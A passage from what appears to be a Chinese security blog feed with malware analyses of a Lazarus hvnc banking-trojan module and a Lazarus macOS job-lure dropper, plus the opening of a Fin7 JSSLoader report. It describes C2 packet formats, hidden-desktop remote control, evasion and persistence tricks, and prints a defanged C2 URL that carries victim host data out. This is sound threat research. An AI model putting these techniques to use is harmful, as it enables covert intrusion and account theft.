src="46cb6af1/clip_image035.png"></p><h3 id="8-获取C-amp-C地址"><a href="#8-获取C-amp-C地址" class="headerlink" title="8.获取C&amp;C地址"></a>8.获取C&amp;C地址</h3><p>&emsp;&emsp;从error.log文件中获取数据并与dl.dropboxusercontent.com进行拼接得到包含C&amp;C地址的文件下载地址, 然后通过GET请求获取该地址拿到最终的C&amp;C地址。</p><p><img src="46cb6af1/clip_image037.png"></p><h3 id="9-发送上线包"><a href="#9-发送上线包" class="headerlink" title="9.发送上线包"></a>9.发送上线包</h3><p>&emsp;&emsp;将受害者的操作系统版本信息、是否存在安全软件和生成的标识符作为上线包上传到C&amp;C服务器, 路径为post2.php。</p><p><img src="46cb6af1/clip_image039.png"></p><h3 id="10-获取指令"><a href="#10-获取指令" class="headerlink" title="10.获取指令"></a>10.获取指令</h3><p>&emsp;&emsp;通过Get请求从拼接后的连接获取数据, 读取数据中第三个’%’后的内容,并以”\r”、”\n”作为结束符。读取数据中的阿拉伯数字作为指令ID。</p><p><img src="46cb6af1/clip_image041.png"></p><h3 id="11-文件下载并执行"><a href="#11-文件下载并执行" class="headerlink" title="11.文件下载并执行"></a>11.文件下载并执行</h3><p>&emsp;&emsp;接收到从C&amp;C服务器下发的指令并从中解析出指令ID和文件下载地址。使用GET请求下载文件然后将其映射到内存并加载。通过指令ID来判断调用导出函数”SEStart”或”SEEnd”。</p><p><img src="46cb6af1/clip_image043.png"></p><h2 id="4-hvncengine-dll分析"><a href="#4-hvncengine-dll分析" class="headerlink" title="4.hvncengine.dll分析"></a>4.hvncengine.dll分析</h2><p>&emsp;&emsp;该程序为恶意程序IEUpdate从C&amp;C服务器下载的模块, hvnc全名<br>为”Hidden Virtual Network Connection” ，主要用于银行盗号木马中，vnc原本是一种远程桌面管理软件，在远程可以通过VNC对受控电脑进行控制。而对于恶意程序来说，在对受控电脑进行控制时，会不择手段将自身隐藏，但是使用VNC控制受控电脑时, 当执行的操作为图形化界面时,很难不被受害者发现。<br>&emsp;&emsp;在国内很多金融相关的业务在用户登录账号时,都需要用户安装数字证书或者其他验证工具，若用户从其他机器登录账号时, 会需要用户进行身份认证，因此攻击者为了盗窃受害者的银行账户的钱款或者其他需要身份认证的资产时，攻击者研发出了hvnc来解决使用VNC共享桌面时会被受害者发现的问题。</p><h3 id="1-样本描述"><a href="#1-样本描述" class="headerlink" title="1.样本描述"></a>1.样本描述</h3><p>&emsp;&emsp;由恶意程序IEUpdate下载的恶意模块都包含SEStart和SEEnd两个导出函数,<br>SEStart主要通过socket来实现hvnc的功能，SEEnd用于关闭socket链接、结束管道句柄和结束执行主要后门逻辑的线程。其中生成标识符的算法与恶意程序IEUpdate一样。</p><h3 id="3-检测主逻辑线程"><a href="#3-检测主逻辑线程" class="headerlink" title="3.检测主逻辑线程"></a>3.检测主逻辑线程</h3><p>&emsp;&emsp;在标识符成功生成后, 恶意程序检测核心功能线程是否已经在启动中避免线程被重复创建, 如果线程仍然在执行中或者则不再创建新的线程。如果线程由于某种原因出现异常但是线程没有被结束则首先结束线程然后再创建新的线程来执行主要逻辑代码。</p><p><img src="46cb6af1/clip_image045.png"></p><h3 id="4-执行hvnc线程"><a href="#4-执行hvnc线程" class="headerlink" title="4.执行hvnc线程"></a>4.执行hvnc线程</h3><p>&emsp;&emsp;每隔10分钟执行一次恶意代码, 只有在主模块调用SEEnd函数后才会结束循环。在线程函数hvnc_thread内执行一系列与hvnc相关的功能。</p><p><img src="46cb6af1/clip_image047.png"></p><h3 id="5-执行hvnc功能"><a href="#5-执行hvnc功能" class="headerlink" title="5.执行hvnc功能"></a>5.执行hvnc功能</h3><p>&emsp;&emsp;使用前面生成的标识符为名创建一个新的隐藏桌面，在后续涉及到桌面的操作时使用函数SetThreadDesktop来指定隐藏桌面让相关操作在该桌面下被执行。<br>&emsp;&emsp;在创建进程时设置STARTUP_INFO结构体的字段lpDesktopInfo为hDesktop,可使进程在隐藏桌面下执行进程。</p><p><img src="46cb6af1/clip_image049.png"></p><h3 id="6-C-amp-C通信"><a href="#6-C-amp-C通信" class="headerlink" title="6. C&amp;C通信"></a>6. C&amp;C通信</h3><p>&emsp;&emsp;读取位于目录”%LOCALAPPDATA%/Microsoft/PlayReady”处的error.log文件的数据并与”dl.dropboxusercontext.com”拼接得到存放于公共托管服务网站dropbox中保存实际C&amp;C地址的文件地址。通过GET请求该地址得到C&amp;C地址,然后尝试通过socket与其进行通信。<br><img src="46cb6af1/clip_image051.png"></p><p>&emsp;&emsp;如果使用socket能够成功连接上目标地址，则尝试发送上线数据包并等待C&amp;C服务器下发指令。上线数据包构造如下图：</p><p> <img src="46cb6af1/clip_image053.png"></p><p>   用伪代码表示如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">packet_format</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//默认为”)(*&amp;POIU:LKJ”</span></span><br><span class="line">  <span class="type">uint8_t</span> magic_start[<span class="number">0xc</span>];</span><br><span class="line">  <span class="comment">//存放加密的数据”D9 C8 CC CB EB C9 D9 C8”</span></span><br><span class="line">  <span class="comment">//解密后的值为”00000000”</span></span><br><span class="line">  <span class="type">uint8_t</span> unkown[<span class="number">0x8</span>];</span><br><span class="line">  <span class="type">uint32_t</span> type;<span class="comment">//数据包类型,0为上线包</span></span><br><span class="line">  <span class="type">uint32_t</span> id_size;<span class="comment">//标识符的大小</span></span><br><span class="line">  <span class="type">uint8_t</span> id_str[id_size];<span class="comment">//标识符</span></span><br><span class="line">  <span class="comment">//固定为^%$#YTREHGFD</span></span><br><span class="line">  <span class="type">uint8_t</span> magic_end[<span class="number">0xc</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;C&amp;C服务器下发指令时, 恶意程序首先读取12字节判断是否是magic_start字符串，如果是则继续读取C&amp;C指令剩余部分，否则继续从C&amp;C服务器接收指令。</p><p><img src="46cb6af1/clip_image055.png"></p><p>&emsp;&emsp;与C&amp;C通信中使用的指令ID如下表,</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>指令ID</td><td>描述</td></tr><tr><td>0x01</td><td>持续发送截图数据</td></tr><tr><td>0x02</td><td>停止发送截图数据</td></tr><tr><td>0x03</td><td>执行下发的命令</td></tr><tr><td>0x05</td><td>模拟键盘操作</td></tr><tr><td>0x06</td><td>模拟鼠标操作</td></tr><tr><td>0x07</td><td>执行程序explorer.exe</td></tr><tr><td>0x08</td><td>执行chrome浏览器</td></tr></tbody></table><h3 id="6-屏幕截图"><a href="#6-屏幕截图" class="headerlink" title="6.屏幕截图"></a>6.屏幕截图</h3><p>&emsp;&emsp;恶意程序使用了两个与屏幕截图相关的指令ID: 0x01和0x02, 0x01为持续不断的对屏幕进行截图并发送到C&amp;C服务器中。<br>&emsp;&emsp;每隔200ms对屏幕进行一次截图并上传到C&amp;C服务器中, 如果与服务器通信失败或者sceen_shot_flag值为0, 则退出截图。0x02设置sceen_shot_flag值为0表示即将结束截图, 在屏幕截图过程中，会判断该标志的值来决定是否结束屏幕截图。<br>&emsp;&emsp;首先遍历所有桌面, 找到受害者使用的桌面，然后针对该桌面创建BitBit对象并将其转换成image流数据, 也就是说对受害者使用的桌面进行截图。<br>&emsp;&emsp;为了能够将截图后的数据上传到C&amp;C服务器, 从流中读取数据并保存。</p><p><img src="46cb6af1/clip_image057.png"></p><p>&emsp;&emsp;截图完成后,构造发送给C&amp;C的数据包, 数据包使用固定的包格式。</p><p><img src="46cb6af1/clip_image059.png"></p><p>&emsp;&emsp;使用的数据包格式如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Struct packet_format&#123;</span><br><span class="line">    Uint8_t magic[<span class="number">0xc</span>];<span class="comment">//固定值)(*&amp;POIU:LKJ</span></span><br><span class="line">    Uin8_t unkown;<span class="comment">//固定值00000000</span></span><br><span class="line">    Uint8_t type;<span class="comment">//应该是包类型,4是截图数据</span></span><br><span class="line">    Uint8_t img_info_size;<span class="comment">//截图相关数据大小</span></span><br><span class="line">    <span class="keyword">struct</span> &#123; <span class="comment">//结构体大小为img_info_size</span></span><br><span class="line">       <span class="type">uint32_t</span> weight;<span class="comment">//屏幕宽度</span></span><br><span class="line">       <span class="type">uint32_t</span> height;<span class="comment">//屏幕高度</span></span><br><span class="line">       <span class="type">uint32_t</span> img_data_size;<span class="comment">//屏幕截图数据的大小</span></span><br><span class="line">       <span class="type">uint8_t</span> img_data[img_data_size];<span class="comment">//屏幕截图数据</span></span><br><span class="line">    &#125;</span><br><span class="line">    Uint8_t magic_end[<span class="number">0xc</span>];<span class="comment">//固定值^%$#YTREHGFD</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="7-执行命令"><a href="#7-执行命令" class="headerlink" title="7.执行命令"></a>7.执行命令</h3><p>&emsp;&emsp;当接收到的C&amp;C指令ID为3时为执行任意命令, 要执行的命令在C&amp;C指令参数中, 通过创建进程将命令行参数设置为由服务器下发的要执行的命令行的方式来执行命令。为了避免被受害者发现, 将STARTUP_INFO结构体的字段lpDesktop设置为隐藏桌面。</p><p><img src="46cb6af1/clip_image061.png">        </p><h3 id="8-键盘模拟"><a href="#8-键盘模拟" class="headerlink" title="8.键盘模拟"></a>8.键盘模拟</h3><p>&emsp;&emsp;当C&amp;C指令ID为5时模拟键盘操作，主要通过对目标窗口对象发送WM_KEYUP、WM_KEYDOWN和WM_CHAR来模拟所有的按键操作。要操作的窗口对象则是 通过窗口位置来获取, 最后通过PostMessageA将消息发送到目标窗口。</p><p><img src="46cb6af1/clip_image063.png"></p><h3 id="9-模拟鼠标操作"><a href="#9-模拟鼠标操作" class="headerlink" title="9.模拟鼠标操作"></a>9.模拟鼠标操作</h3><p>&emsp;&emsp;攻击者在使用hvnc功能操作桌面时，不可避免要对桌面的窗口进行操作, 恶意程序通过向指定的窗口发送窗口消息来对窗口进行操作，其中进行的操作和操作时需要的参数由C&amp;C服务器下发，参数一般是发送窗口消息时需要的wparam值。<br>恶意程序利用消息机制模拟了多种鼠标的操作，比如使用鼠标拖曳窗口、鼠标单击双击和滑动鼠标滚轮等等。</p><p>l  <strong>模拟拖曳窗口</strong></p><p>&emsp;&emsp;通过修改目标窗口对象的left、top、width和height四个值来实现窗口放大、缩小和移动等功能，</p><p><img src="46cb6af1/clip_image065.png">    </p><p>l  <strong>模拟点击菜单项</strong></p><p>&emsp;&emsp;恶意程序判断当前鼠标位置是否属于任务栏的开始菜单范围内，如果在则发送WM_CLICK消息模拟鼠标单击来模拟鼠标点击开始菜单的事件；如果不在则判断鼠标所在位置是否在窗口类名为”#32768”的窗口控件中，该窗口控件实际上就是菜单栏，如果鼠标位置在菜单栏范围内, 则模拟鼠标点击某个菜单项。<br>&emsp;&emsp;首先发送消息MN_GETHMENU获取菜单对象句柄，然后通过菜单句柄获取当前鼠标指向的菜单项对应的菜单资源ID, 最后发送两个消息MN_SELECITEM和WM_KEYDOWN模拟鼠标点击菜单项。</p><p><img src="46cb6af1/clip_image067.png"></p><h3 id="10-执行Explorer-exe程序"><a href="#10-执行Explorer-exe程序" class="headerlink" title="10.执行Explorer.exe程序"></a>10.执行Explorer.exe程序</h3><p>&emsp;&emsp;有时候使用hvnc进行远程操作时,可能会出现界面不显示或者其他异常，攻击者通过让目标机器执行explorer程序来恢复。<br>&emsp;&emsp;设置注册表键TaskbarGlomLevel的值为2使任务栏使用永不分组模式，然后启动进程explorer，进程创建成功后将任务栏设置为AlwayInTop，并恢复TaskbarGlomLevel为修改前的值。<br><img src="46cb6af1/clip_image069.png"></p><h3 id="11-执行chrome程序"><a href="#11-执行chrome程序" class="headerlink" title="11.执行chrome程序"></a>11.执行chrome程序</h3><p>&emsp;&emsp;调用cmd程序执行chrome程序, 并关闭浏览器中比较消耗CPU性能的特性, 比如sanbox、gpu等等, 避免CPU使用率过高而被受害者发现。<br>&emsp;&emsp;启动浏览器时使用受害者默认的配置目录，在访问一些需要账号登录的网站可能因为受害者设置了记住密码或者设置保持登录状态时攻击者不需要账号密码就能够获取受害者的账号信息。</p><p><img src="46cb6af1/clip_image071.png"></p><h3 id="12-消息发送"><a href="#12-消息发送" class="headerlink" title="12.消息发送"></a>12.消息发送</h3><p>&emsp;&emsp;在所有的C&amp;C指令中,只有键盘模拟和鼠标模拟才需要发送消息。恶意程序首先通过窗口位置获取对应的窗口对象，然后将参数转换程序发送消息时对应参数值，最后通过PostMessageA发送给目标窗口。<br>&emsp;&emsp;对应WM_CHAR消息，还需要将对应的字符转换成对应VKEY值，同样是使用PostMessageA发送给目标窗口对象。</p><p><img src="46cb6af1/clip_image073.png"></p><h1 id="3-ATT-amp-CK矩阵"><a href="#3-ATT-amp-CK矩阵" class="headerlink" title="3.   ATT&amp;CK矩阵"></a>3.   ATT&amp;CK矩阵</h1><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>Tactic</td><td>ID</td><td>Name</td><td>Description</td></tr><tr><td>Resource Development</td><td>T1583.006</td><td>Acquire Infrastructure:<br><br>Web Services</td><td>DropBox存放C2地址</td></tr><tr><td>Initial Access</td><td>T1566.001</td><td>Phishing:Spearphishing Attachment</td><td>通过鱼叉式网络钓鱼</td></tr><tr><td>Execution</td><td>T1559</td><td>Inter-Process Communication</td><td>利用管道执行cmd命令</td></tr><tr><td></td><td>T1204</td><td>User Execution</td><td>通过诱导文档诱导执行</td></tr><tr><td>Persistence</td><td>T1547</td><td>Boot or Logon Autostart Execution</td><td>设置自启动注册表</td></tr><tr><td>Privilege Escalation</td><td>T1055</td><td>Process Injection</td><td>将进程注入到进程中WinWord</td></tr><tr><td>Defense Evasion</td><td>T1497</td><td>Virtualization/Sandbox Evasion</td><td>检测自身是否处于沙箱环境</td></tr><tr><td></td><td>T1221</td><td>Template Injection</td><td>使用远程模板注入</td></tr><tr><td></td><td>T1562</td><td>Impair Defenses</td><td>将自身加入Windows Defender的白名单中</td></tr><tr><td>Discovery</td><td>T1010</td><td>Application Window Discovery</td><td>查找窗口,便于使用hvnc远程控制</td></tr><tr><td></td><td>T1083</td><td>File and Directory Discovery</td><td>收集文件信息</td></tr><tr><td></td><td>T1057</td><td>Process Discovery</td><td>检测是否包含安全软件</td></tr><tr><td></td><td>T1012</td><td>Query Registry</td><td>查询TaskbarGlomLevel的值</td></tr><tr><td>Collection</td><td>T1113</td><td>Screen Capture</td><td>收集屏幕截图信息</td></tr><tr><td></td><td>T1056</td><td>Input Capture</td><td>获取键盘按键</td></tr><tr><td>Command and Control</td><td>T1071</td><td>Application Layer Protocol</td><td>使用socket协议进程C&amp;C通信</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.   概述&quot;&gt;&lt;/a&gt;1.   概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;Lazarus组织，又称为HIDDEN COBRA、APT38、Zinc、Guardians of Peace等，是半岛地区最活跃的APT组织之一。该组织的攻击目标涉及波兰、智利、美国、墨西哥、巴西等数十个国家，针对银行、比特币交易所等金融机构及个人实施定向攻击活动，以获取经济利益，堪称全球金融机构的最大威胁之一。&lt;br&gt;&amp;emsp;&amp;emsp;此外，该组织还针对航空航天、COVID-19疫苗技术、政府、媒体等机构及企业进行渗透，以窃取重要资料并进行破坏勒索。&lt;/p&gt;
&lt;h1 id=&quot;2-详细分析&quot;&gt;&lt;a href=&quot;#2-详细分析&quot; class=&quot;headerlink&quot; title=&quot;2. 详细分析&quot;&gt;&lt;/a&gt;2. 详细分析&lt;/h1&gt;&lt;h2 id=&quot;1-诱饵文档&quot;&gt;&lt;a href=&quot;#1-诱饵文档&quot; class=&quot;headerlink&quot; title=&quot;1.诱饵文档&quot;&gt;&lt;/a&gt;1.诱饵文档&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;SaniTox是韩国Jiransecurity的一款反病毒程序, 诱饵文档伪冒SaniTox骗取受害者信任并诱导其启用宏功能以便执行恶意宏代码。&lt;br&gt; &lt;img src=&quot;/post/46cb6af1/clip_image001.png&quot; class=&quot;&quot; title=&quot;example&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="APT分析报告" scheme="http://shxi.cc/categories/APT%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
    
    
    <category term="Lazarus" scheme="http://shxi.cc/tags/Lazarus/"/>
    
  </entry>
  
  <entry>
    <title>Lazarus组织以工作机会为诱饵，分发macOS恶意软件</title>
    <link href="http://shxi.cc/post/3a662960.html"/>
    <id>http://shxi.cc/post/3a662960.html</id>
    <published>2022-10-20T17:23:04.000Z</published>
    <updated>2023-10-17T07:12:33.136Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1.   概述"></a>1.   概述</h1><p>&emsp;&emsp;Lazarus在最近发起了新的一轮攻击活动,在这次攻击中，攻击者通过社会工程学向受害者发送一个伪装成PDF文件的MacOS二进制文件，在文件内部嵌入一个主题为”Crypto.com”招聘职位的虚假信息。<br>&emsp;&emsp;Crypto.com是世界领先的的加密货币交易平台之一,此次活动主要针对的目标为加密领域的开发人员，其目的可能是窃取数字资产和加密货币。</p><h1 id="2-文件信息"><a href="#2-文件信息" class="headerlink" title="2.文件信息"></a>2.文件信息</h1><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>Sha1</td><td>文件名</td></tr><tr><td>a57684cc460d4fc202b8a33870630414b3bbfafc</td><td>1st Stage, xxx</td></tr><tr><td>65b7091af6279cf0e426a7b9bdc4591679420380</td><td>Crypto.com_Job_Opportunities_2022_<br><br>confidential.pdf</td></tr><tr><td>1f0f9020f72aa5a38a89ffd6cd000ed8a2b49edc</td><td>2nd Stage, WifiAnalyticsServ</td></tr><tr><td>1b32f332e7fc91252181f0626da05ae989095d71</td><td>3rd stage, wifianalyticsagent</td></tr></tbody></table><span id="more"></span><h1 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3. 详细分析"></a>3. 详细分析</h1><h2 id="1-FirstStage"><a href="#1-FirstStage" class="headerlink" title="1.FirstStage"></a>1.FirstStage</h2><h3 id="1-任意shell命令执行"><a href="#1-任意shell命令执行" class="headerlink" title="1.任意shell命令执行"></a>1.任意shell命令执行</h3><p>&emsp;&emsp; 恶意程序能够通过popen来指向任意指令。<br><img src="3a662960/clip_image001.png"></p><h3 id="2-释放和打开诱饵文档"><a href="#2-释放和打开诱饵文档" class="headerlink" title="2.释放和打开诱饵文档"></a>2.释放和打开诱饵文档</h3><p>&emsp;&emsp;恶意程序使用两种方法来从MacOS系统中获取用户名: 从环境变量中获取值和使用shell命令”whoami”来获取用户名。<br><img src="3a662960/clip_image003.png"></p><p>&emsp;&emsp;得到受害者计算机的用户名后，在对应的用户目录中创建文件夹用于存放诱饵文档。<br><img src="3a662960/clip_image005.png"></p><p>&emsp;&emsp; 拼接将要执行的shell命令，可以看到恶意程序使用open打开诱饵文档和使用rm来删除com.apple.Terminal.savedState文件,该文件主要用来记录用户执行的所有shell命令，删除该文件来清除攻击者的操作痕迹。<br><img src="3a662960/clip_image007.png"></p><p>&emsp;&emsp;将嵌入在文件内部的pdf诱饵写入到文件中,从文件名中可以看出主题为Crypto.com的招聘信息，主要针对区块链行业人士。<br><img src="3a662960/clip_image009.png"></p><p>&emsp;&emsp;诱饵PDF文件打开如下图:<br><img src="3a662960/clip_image011.png"></p><h3 id="3-释放文件"><a href="#3-释放文件" class="headerlink" title="3.释放文件"></a>3.释放文件</h3><p>&emsp;&emsp;恶意程序在文件内嵌入两个压缩后的可执行文件，文件名分别是WifiAnalytics_和wifianalyticsagent_。<br>&emsp;&emsp;两个文件的释放方式一样，都是先将文件数据写入文件中，然后调用shell命令tar来解压文件到指定目录，解压完成后将写入的压缩数据文件删除。<br><img src="3a662960/clip_image013.png"></p><h3 id="4-检测是否已经执行"><a href="#4-检测是否已经执行" class="headerlink" title="4.检测是否已经执行"></a>4.检测是否已经执行</h3><p>&emsp;&emsp;执行shell命令pgrep并获取输出结果来判断恶意程序wifianalyticsagent是否已经执行。<br><img src="3a662960/clip_image015.png"></p><h3 id="5-持久化"><a href="#5-持久化" class="headerlink" title="5.持久化"></a>5.持久化</h3><p>&emsp;&emsp;该恶意程序与其他的MacOS恶意程序一样，采用plist的方式来实现持久化，在LaunchAgents目录下创建文件” com.wifianalyticsagent.plist”,写入的数据如下, 将RunAtLoad的值设置为True, 在系统开机启动时执行该程序。设置启动名为诱导性的名字”iTunes_trush”用于诱导分析人员或者受害者，使他们认为该程序为合法应用。<br><img src="3a662960/clip_image017.png"></p><h3 id="6-状态标志"><a href="#6-状态标志" class="headerlink" title="6.状态标志"></a>6.状态标志</h3><p>&emsp;&emsp;有意思的是程序内部定义了一些全局变量用于标记程序执行的阶段和某些状态，但是并没有被引用，定义的全局变量如下:<br><img src="3a662960/clip_image019.png"></p><p>         每个全局变量表示的内容如下：</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>变量名</td><td>描述</td></tr><tr><td>g_a</td><td>data5文件释放成功</td></tr><tr><td>g_b</td><td>解压和删除文件成功</td></tr><tr><td>g_c</td><td>Wifianalyticsagent为执行状态</td></tr><tr><td>g_d</td><td></td></tr><tr><td>g_e</td><td>Wifianalyticsagent文件是否存在</td></tr></tbody></table><h3 id="7-守护进程"><a href="#7-守护进程" class="headerlink" title="7.守护进程"></a>7.守护进程</h3><p>&emsp;&emsp;恶意程序为了避免进程被结束,创建一个无限循环不断的在检测程序wifianalyticsagent是否处于运行状态，如果没有运行则使用shell命令启动该进程并写入plist文件来设置macOS系统的启动项。<br><img src="3a662960/clip_image021.png"></p><h2 id="2-SecondStage"><a href="#2-SecondStage" class="headerlink" title="2.SecondStage"></a>2.SecondStage</h2><p>&emsp;&emsp;该阶段的恶意程序的主要功能为下载恶意程序并执行,文件下载链接为:<br>“<strong>hxxps://market.contradecapital.com/{用户名}.png</strong>“,下载完成后保存为文件”WifiCloudWidget”.<br><img src="3a662960/clip_image023.png"><br>&emsp;&emsp; 在linux系统下,uname用于显示系统信息，macOS提供了uname函数来获取系统信息，获取到的系统信息保存为结构体utsname, 这里使用了其中的字段nodename和machine作为Get请求的一部分。<br>&emsp;&emsp;调用shell命令”sw -productversion”获取MacOS操作系统版本号，同样将其作为Get请求的一部分。<br><img src="3a662960/clip_image025.png"><br>&emsp;&emsp;恶意程序通过将受害者的用户名和操作系统等信息作为GET请求时的参数发送到C&amp;C服务器和等待C&amp;C服务器下发恶意程序。<br>&emsp;&emsp;最终的文件下载链接如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hxxps://market.contradecapital.com/&#123;user&#125;.png?response=&#123;nodeName&#125;/&#123;dst&#125;/&#123;os_version&#125;/&#123;machine&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;恶意程序使用Libcurl库来下载文件,使用的请求头如下:<br><strong>UserAgent:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0+(Macintosh;Intel+Mac+OS+X+12_4)+AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7</span><br></pre></td></tr></table></figure><p><strong>请求头:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Encoding: application/x-www-form-urlencoded; charset=UTF-8</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;文件下载代码如下:<br><img src="3a662960/clip_image027.png"><br>&emsp;&emsp;下载的文件使用tar压缩格式，还需要将其解压，恶意程序调用shell命令来解压文件。由于C&amp;C服务器已经失效,现在已经无法获取到有效的文件，因此无法对后续文件进行分析。<br><img src="3a662960/clip_image029.png"></p><h1 id="4-IOC"><a href="#4-IOC" class="headerlink" title="4. IOC"></a>4. IOC</h1><p>market.contradecapital[.]com<br>~/Library/LaunchAgents/com.wifianalyticsagent.plist<br>~/Library/WifiPreference/WifiAnalyticsServ.app<br>~/Library/WifiPreference/WifiCloudWidget<br>~/Library/WifiPreference/wifianalyticsagent<br>~/Library/WifiPreference/Crypto.com_Job_Opportunities_2022_<br>confidential.pdf</p><h1 id="7-参考"><a href="#7-参考" class="headerlink" title="7. 参考"></a>7. 参考</h1><p>hxxps://<a href="http://www.sentinelone.com/blog/lazarus-operation-interception-targets-macos-users-dreaming-of-jobs-in-crypto">www.sentinelone.com/blog/lazarus-operation-interception-targets-macos-users-dreaming-of-jobs-in-crypto</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.   概述&quot;&gt;&lt;/a&gt;1.   概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;Lazarus在最近发起了新的一轮攻击活动,在这次攻击中，攻击者通过社会工程学向受害者发送一个伪装成PDF文件的MacOS二进制文件，在文件内部嵌入一个主题为”Crypto.com”招聘职位的虚假信息。&lt;br&gt;&amp;emsp;&amp;emsp;Crypto.com是世界领先的的加密货币交易平台之一,此次活动主要针对的目标为加密领域的开发人员，其目的可能是窃取数字资产和加密货币。&lt;/p&gt;
&lt;h1 id=&quot;2-文件信息&quot;&gt;&lt;a href=&quot;#2-文件信息&quot; class=&quot;headerlink&quot; title=&quot;2.文件信息&quot;&gt;&lt;/a&gt;2.文件信息&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Sha1&lt;/td&gt;
&lt;td&gt;文件名&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;a57684cc460d4fc202b8a33870630414b3bbfafc&lt;/td&gt;
&lt;td&gt;1st Stage, xxx&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;65b7091af6279cf0e426a7b9bdc4591679420380&lt;/td&gt;
&lt;td&gt;Crypto.com_Job_Opportunities_2022_&lt;br&gt;&lt;br&gt;confidential.pdf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1f0f9020f72aa5a38a89ffd6cd000ed8a2b49edc&lt;/td&gt;
&lt;td&gt;2nd Stage, WifiAnalyticsServ&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1b32f332e7fc91252181f0626da05ae989095d71&lt;/td&gt;
&lt;td&gt;3rd stage, wifianalyticsagent&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;</summary>
    
    
    
    <category term="APT分析报告" scheme="http://shxi.cc/categories/APT%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
    
    
    <category term="Lazarus" scheme="http://shxi.cc/tags/Lazarus/"/>
    
  </entry>
  
  <entry>
    <title>Fin7通过XLL扩展投递恶意程序JSSLoader</title>
    <link href="http://shxi.cc/post/1364ae67.html"/>
    <id>http://shxi.cc/post/1364ae67.html</id>
    <published>2022-09-01T18:02:16.000Z</published>
    <updated>2023-10-17T07:19:41.672Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1.   概述"></a>1.   概述</h1><p>&emsp;&emsp;该组织属于民间APT组织，自2015年以来，FIN7成员参与了针对100多家美国公司的高度复杂的恶意软件活动，主要集中在餐馆，游戏和酒店行业。<br>&emsp;&emsp;该组织通常使用针对受害者的恶意软件网络钓鱼攻击，希望能够通过他们渗透系统窃取银行卡数据并将其出售。<br>&emsp;&emsp;JSSLoader为该APT在进行攻击时使用的一个组件，虽然JSSLoader以最小化的.Net RAT而闻名，但是麻雀虽小，五脏俱全, 比如持久化、自动更新、恶意软件下载、数据泄露等等功能都包含。</p><h1 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3. 详细分析"></a>3. 详细分析</h1><h2 id="1-ExcelDna-xll分析"><a href="#1-ExcelDna-xll分析" class="headerlink" title="1. ExcelDna.xll分析"></a>1. ExcelDna.xll分析</h2><p> &emsp;&emsp;XLL插件是Excel文件的扩展，实际上只是一个普通的dll文件。Excel对其xll插件创建了关联，使其能够双击运行。<br> &emsp;&emsp;XLL插件显示的图标与其他Excel文件显示的图标非常相似, 普通用户不会注意到XLL与其他Excel文件之间的任何区别，并且可以被诱导打开。</p><img src="/post/1364ae67/clip_image001.png" class="" title="example"><span id="more"></span><p> &emsp;&emsp;每个XLL插件必须实现和导出函数xlAUtoOpen和xlAutoClose，这两个函数分别在Excel加载XLL插件后激活插件或者卸载插件时被调用。<br> 